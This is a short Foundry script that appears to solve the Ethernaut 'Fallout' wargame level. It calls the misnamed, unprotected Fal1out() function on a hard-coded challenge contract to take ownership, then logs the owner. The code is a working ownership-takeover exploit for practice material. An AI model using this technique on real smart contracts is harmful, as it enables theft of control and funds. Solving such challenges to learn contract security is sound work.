//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallout} from "../src/Fallout.sol";
import {Script, console} from "forge-std/Script.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(0x61F3486Fc75df31a8df817dD2e490046A2cE74a6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        falloutInstance.Fal1out();

        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        console.log("Fallout owner is :", falloutInstance.owner());

        vm.stopBroadcast();
    }
}
